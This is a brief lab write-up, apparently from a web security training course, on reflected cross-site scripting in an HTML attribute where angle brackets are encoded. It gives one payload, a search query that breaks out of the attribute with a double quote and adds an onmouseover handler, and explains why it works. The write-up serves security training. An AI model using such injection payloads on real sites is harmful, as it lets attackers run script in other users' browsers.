# Lab 7 — Reflected XSS in Attribute, Angle Brackets Encoded (APPRENTICE)

## Payload
```
/search?search=" onmouseover="alert(1)
```
Angle brackets encoded but `"` is not → breaks out of attribute context.
